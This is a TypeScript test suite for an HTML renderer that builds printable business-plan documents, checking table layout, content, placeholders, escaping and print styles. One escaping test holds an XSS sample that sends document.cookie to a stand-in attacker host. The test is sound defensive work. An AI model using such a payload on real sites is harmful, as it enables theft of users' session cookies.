// Fin — the plan document.
//
// CLAUDE.md rule 8, and it is a structural rule rather than a style
// preference: the first version rendered as an unstyled, colourless wall of
// text in some environments because CSS Grid, Flexbox and custom properties
// all failed silently. This is built the way HTML email is built — real
// tables, hard-coded hex — because it has to survive WhatsApp's in-app
// browser, a real browser's print-to-PDF, and whatever the owner opens it in.
//
// The assertions below are deliberately mechanical. A human reviewing a
// redesign will not notice one `display:flex` sneaking into a nested block;
// this will.

import { test, describe } from "node:test";
import assert from "node:assert/strict";

import { planDocHTML, type PlanDocData } from "../api/_lib/plandoc.js";
import type { HydratedWorkstream } from "../api/_lib/playbooks.js";

const daysAgo = (n: number) => new Date(Date.now() - n * 864e5).toISOString().slice(0, 10);

const workstream: HydratedWorkstream = {
  id: "m_owed",
  title: "Collect the money already owed to you",
  domain: "spending",
  why: "That money is already yours.",
  why_for_you: "Three customers still owe you from last month.",
  steps: [
    {
      id: "o1",
      title: "List everyone who owes you and how much",
      domain: "family_money",
      outcome: "One list.",
      done_when: "the list is written",
      brief: "…",
      artifact_brief: "a simple owed-money list",
      tool_choices: ["sheets"],
      push: "Write down every unpaid job with the amount and the date.",
      artifact: "Name | Job | Amount | Date",
      why_for_you: "You said people take months to pay.",
      tool_id: "sheets",
    },
    {
      id: "o2",
      title: "Send one calm message to each",
      domain: "spending",
      outcome: "Money in this week.",
      done_when: "you've messaged everyone on the list",
      brief: "…",
      artifact_brief: null,
      push: "One message per person, with the amount and a way to pay now.",
      artifact: null,
      why_for_you: "",
      tool_id: null,
    },
  ],
};

const base = (over: Partial<PlanDocData> = {}): PlanDocData => ({
  productName: "Fin",
  countryCode: "ZA",
  ctx: {
    name: "Thabo's Laundry",
    one_liner: "Wash, dry and fold for households and small guesthouses in Soweto.",
    location: "Soweto, Johannesburg",
    goal: "I want steadier money instead of good weeks and dead weeks.",
  },
  stage: "run",
  objectiveRead: "Replace unpredictable walk-in income with standing weekly work.",
  goal: [
    { label: "Steadier money", what: "Replace unpredictable walk-in income with standing weekly work", why_you: "Good weeks and dead weeks are what you named", worth: "R900 a week, on your own figure", first_move: "Walk in with a price sheet", catch: "They will want a trial first" },
  ],
  rule: [
    { rule: "Collected and back by the same evening", why_it_works: "A guesthouse cannot wait two days for linen", what_it_costs_you: "You have to hold an evening slot" },
  ],
  alternatives: [
    { name: "Doing it in-house", why_people_do_it: "It feels free", where_it_leaves_them: "It ties up a staff member every morning" },
  ],
  map: [
    { domain: "income", status: "amber", note: "Trading as a sole proprietor" },
    { domain: "spending", status: "red", note: "Cash only, and people pay late" },
    { domain: "debt", status: "green", note: "Prices are written down" },
    { domain: "cushion", status: "amber", note: "Regulars, but nothing written down" },
    { domain: "credit_record", status: "red", note: "Word of mouth only" },
  ],
  plan: { headline: "Ninety days on collecting what you are owed.", order_note: "Only one part.", goal: "R4,000 a week in standing work by day 90.", workstreams: [workstream] },
  tools: {
    sheets: { id: "sheets", name: "Google Sheets", url: "https://sheets.google.com", why: "A list you can sort, on the phone you already have", cost: "Free", verified_on: daysAgo(5) },
  },
  ...over,
});

const html = planDocHTML(base());

describe("how the plan document is built", () => {
  test("every layout structure is a real table, marked as presentational", () => {
    assert.ok(html.includes('<table role="presentation"'), "layout is tables, the way HTML email is built");
    const presentational = html.match(/<table role="presentation"/g)?.length ?? 0;
    const allTables = html.match(/<table\b/g)?.length ?? 0;
    assert.equal(presentational, allTables, "every table in the document declares itself presentational");
    assert.ok(presentational >= 8, "the document really is table-laid-out, not one token table");
  });

  test("nothing depends on CSS Grid or Flexbox", () => {
    assert.ok(!/display\s*:\s*grid/i.test(html), "Grid fails silently in the renderers this has to survive");
    assert.ok(!/display\s*:\s*flex/i.test(html), "so does Flexbox");
    assert.ok(!/display\s*:\s*inline-flex/i.test(html));
  });

  test("nothing depends on a CSS custom property", () => {
    assert.ok(!html.includes("var(--"), "a renderer that drops var() renders a colourless wall of text");
    assert.ok(!/--[a-z-]+\s*:/i.test(html), "and none are declared either");
  });

  test("colours are hard-coded hex, including the brand's own", () => {
    assert.ok(html.includes("#14181d"), "the ink");
    assert.ok(html.includes("#0f766e"), "the teal");
  });

  test("no negative-margin bleed tricks", () => {
    assert.ok(!/margin[^;"]*:\s*-/i.test(html));
  });

  test("it is a complete document a browser can print on its own", () => {
    assert.ok(html.startsWith("<!doctype html>"));
    assert.ok(html.trimEnd().endsWith("</html>"));
    assert.ok(html.includes('<meta charset="utf-8">'));
    // Definition of done: this has to survive a real print-to-PDF.
    assert.ok(html.includes("@page"), "page size and margins are part of the contract");
    assert.ok(html.includes("page-break-inside"), "a step split across two pages loses the artifact box");
  });

  test("the only stylesheet is the print block, so nothing else can fail to load", () => {
    assert.equal(html.match(/<style>/g)?.length, 1);
    assert.ok(!html.includes("<link"), "an external stylesheet is one more thing that can silently not arrive");
    assert.ok(!html.includes("<script"), "nothing in a plan document needs to execute");
  });
});

describe("what the document says", () => {
  test("it leads with the business, in the owner's own words", () => {
    assert.ok(html.includes("Thabo&#x27;s Laundry") || html.includes("Thabo's Laundry"));
    assert.ok(html.includes("I want steadier money instead of good weeks and dead weeks."));
    assert.ok(html.includes("Replace unpredictable walk-in income with standing weekly work."));
  });

  test("every part and every step of the plan is in it", () => {
    assert.ok(html.includes("Collect the money already owed to you"));
    assert.ok(html.includes("List everyone who owes you and how much"));
    assert.ok(html.includes("Send one calm message to each"));
    assert.ok(html.includes("Write down every unpaid job with the amount and the date."));
    assert.ok(html.includes("2 steps"), "the header counts what is actually there");
  });

  test("a ready-to-send artifact appears only for the step that has one", () => {
    // A "Name | Job | …" artifact is a sheet: printed as columns to copy, and
    // never labelled "Ready to send" (round 17).
    assert.equal(html.match(/Ready to send|copy these columns|What to say|To keep and fill in/g)?.length, 1);
    assert.match(html, /Your sheet: copy these columns/);
    for (const c of ["Name", "Job", "Amount", "Date"]) assert.ok(html.includes(`>${c}</td>`), c);
  });

  test("only the tools the plan actually uses are listed", () => {
    assert.ok(html.includes("Google Sheets"));
    assert.ok(html.includes("The tools this plan uses"));
  });

  test("the footer names the owner's own registrar and tax authority", () => {
    assert.ok(html.includes("National Credit Regulator"));
    assert.ok(html.includes("SASSA"));
    assert.ok(html.includes("SARS"));
    assert.ok(!html.includes("CIPC"), "nobody is told to confirm anything with a company registrar");
  });

  // CLAUDE.md rule 10: a price older than 90 days is hedged automatically.
  test("a stale price carries its hedge into the document", () => {
    const stale = planDocHTML(base({ tools: { sheets: { ...base().tools.sheets!, cost: "R249 a month", verified_on: daysAgo(200) } } }));
    assert.ok(stale.includes("R249 a month — confirm at sign-up"));
    assert.ok(!html.includes("confirm at sign-up"), "a freshly checked price is not hedged");
  });
});

// PRIORITY 5.1's gap, closed: track1 (PR #22) built engine/artifact.ts's
// checkArtifact() as the choke point for the WhatsApp send path and the
// per-step PDF, and flagged explicitly in its own body that plandoc.ts was
// never touched — a step's artifact reached this document, the full-plan
// PDF AND the plan webpage (api/plan.ts shares this exact renderer), raw.
describe("PRIORITY 5.1: an unresolved artifact placeholder never reaches this document", () => {
  const withArtifact = (artifact: string | null) =>
    planDocHTML(
      base({
        plan: {
          ...base().plan,
          workstreams: [{ ...workstream, steps: [{ ...workstream.steps[0]!, artifact }] }],
        },
      }),
    );

  test("an unresolvable placeholder (a future customer's name, a link that does not exist yet) is never sent verbatim", () => {
    const doc = withArtifact("Hi [Name], thanks for choosing Thabo's Laundry — could you leave us a review? [Link to Google profile]");
    assert.doesNotMatch(doc, /\[Name\]/i, "must not reach the document verbatim");
    assert.doesNotMatch(doc, /\[Link to Google profile\]/i);
    // On paper an unfilled part is a line to write on, named — the WhatsApp
    // apology printed in its place was round 17's "Ready to send" with no message.
    assert.match(doc, /________ \(Name\)/);
    assert.match(doc, /________ \(Link to Google profile\)/);
    assert.doesNotMatch(doc, /write that part yourself/i);
  });

  test("a placeholder Fin actually knows — the business's own name — is filled in, not withheld", () => {
    const doc = withArtifact("Thanks for choosing [Your Name]! Tell your friends.");
    assert.match(doc, /Thanks for choosing Thabo['’]s Laundry! Tell your friends\./);
    assert.doesNotMatch(doc, /\[Your Name\]/);
  });

  test("no artifact at all still renders cleanly, with no 'Ready to send' box", () => {
    const doc = withArtifact(null);
    assert.equal(doc.match(/Ready to send/g), null);
  });
});

// A plan document must never tell an owner to use something that is not live
// for them.
describe("the sections that only appear when they are real", () => {
  test("the connector section is absent until the owner has actually connected their AI", () => {
    assert.ok(!html.includes("Your own AI is connected"));
    assert.ok(!html.includes("Carrying this with you"));
  });

  // Only connected owners see this. It says the connection is live and never
  // sends them to "connect" for an address — a new one would switch theirs off.
  test("once connected, the section says so, prints no address, and warns before replacing", () => {
    const connected = planDocHTML(base({ connectorUrl: "https://fin.example/mcp/abc123" }));
    assert.ok(connected.includes("Your own AI is connected"));
    assert.ok(!connected.includes("/mcp/"), "no address, placeholder or real, is printed");
    assert.match(connected, /choose a new one; the old one then stops working/);
  });

  test("the online-plan section appears only when there is somewhere to read it", () => {
    assert.ok(!html.includes("Read it online"));
    assert.ok(planDocHTML(base({ planUrl: "https://fin.example/plan" })).includes("Read it online"));
  });

  test("the tools section is absent when the plan names no tool", () => {
    const toolless = planDocHTML(
      base({ plan: { ...base().plan, workstreams: [{ ...workstream, steps: workstream.steps.map((s) => ({ ...s, tool_id: null })) }] } }),
    );
    assert.ok(!toolless.includes("The tools this plan uses"));
  });
});

describe("text the owner wrote is never treated as markup", () => {
  test("angle brackets and ampersands in a business name are escaped", () => {
    const risky = planDocHTML(base({ ctx: { ...base().ctx, name: "Sipho <b>&</b> Sons" } }));
    assert.ok(risky.includes("Sipho &lt;b&gt;&amp;&lt;/b&gt; Sons"));
    assert.ok(!risky.includes("Sipho <b>&</b> Sons"));
    assert.ok(risky.includes("<title>Sipho &lt;b&gt;&amp;&lt;/b&gt; Sons"), "the page title is escaped too");
  });

  test("a script tag typed into an answer cannot execute", () => {
    const risky = planDocHTML(
      base({ ctx: { ...base().ctx, goal: "<script>fetch('https://evil.example/'+document.cookie)</script>" } }),
    );
    assert.ok(!risky.includes("<script"));
    assert.ok(risky.includes("&lt;script&gt;"));
  });

  test("escaping survives every field an owner or a model can fill", () => {
    const risky = planDocHTML(
      base({
        objectiveRead: "<i>a</i>",
        goal: [{ label: "<i>b</i>", what: "<i>c</i>", why_you: "<i>d</i>", worth: "<i>e</i>", first_move: "<i>f</i>", catch: "<i>g</i>" }],
        rule: [{ rule: "<i>h</i>", why_it_works: "<i>i</i>", what_it_costs_you: "<i>j</i>" }],
        alternatives: [{ name: "<i>k</i>", why_people_do_it: "<i>l</i>", where_it_leaves_them: "<i>m</i>" }],
        map: [{ domain: "income", status: "red", note: "<i>n</i>" }],
      }),
    );
    assert.ok(!risky.includes("<i>"), "not one owner-supplied field reaches the page as markup");
  });
});

describe("a plan that is missing pieces still renders", () => {
  test("no goals, no rule, no alternatives and an empty map", () => {
    const sparse = planDocHTML(base({ goal: [], rule: [], alternatives: [], map: [] }));
    assert.ok(sparse.startsWith("<!doctype html>"));
    assert.ok(sparse.includes("0 of 8 areas sorted"));
  });

  test("a step naming a tool the tools list does not have does not break the page", () => {
    const orphan = planDocHTML(base({ tools: {} }));
    assert.ok(orphan.startsWith("<!doctype html>"));
    assert.ok(!orphan.includes("The tools this plan uses"), "a tool with no row behind it is not named at all");
  });

  test("one part is described as one part, not one parts", () => {
    assert.ok(html.includes("1 focus area"));
    assert.ok(!html.includes("1 focus areas"));
  });
});

// Print layout, 2026-09-23: a stress plan (long names, a long unbroken link in
// a ready-to-send message, many steps) printed with a step running off the
// right edge, its number badge squashed into a sliver, message line breaks
// lost, and section headings stranded at the foot of a page. The real-print
// check is scripts/check-plan-print.mjs; these pin the structure that fixed it.
describe("print layout", () => {
  const long = "https://www.sars.gov.za/register-for-vat/?reference=" + "A".repeat(80);
  const ws: HydratedWorkstream = { ...workstream, steps: [{ ...workstream.steps[0]!, artifact: `Hi {name}!\nReply BOOK for a time.\n${long}` }, workstream.steps[1]!] };
  const doc = planDocHTML(base({ plan: { ...base().plan, workstreams: [ws] } }));

  test("long unbroken strings break instead of widening the page", () => {
    assert.match(doc, /<body[^>]*overflow-wrap:anywhere/);
    assert.match(doc, /table-layout:fixed/);
  });
  test("a ready-to-send message keeps its line breaks", () => {
    assert.match(doc, /Hi \{name\}!<br>Reply BOOK for a time\.<br>/);
  });
  test("the step number is a fixed-size badge, not a cell that stretches with the step", () => {
    assert.match(doc, /<div style="width:24px;height:24px;line-height:24px;[^"]*border-radius:12px">1<\/div>/);
  });
  test("headings stay with what follows; header rows repeat; rows are never cut in half", () => {
    assert.ok((doc.match(/class="keepnext"/g) ?? []).length >= 5);
    assert.match(doc, /\.keepnext \{ page-break-after: avoid; break-after: avoid; \}/);
    assert.match(doc, /<thead><tr>/);
    assert.match(doc, /tr \{ page-break-inside: avoid; break-inside: avoid; \}/);
  });
  test("still rule 8: no grid, flex, custom properties", () => {
    assert.doesNotMatch(doc, /display:\s*(grid|flex)|var\(--/);
  });
});
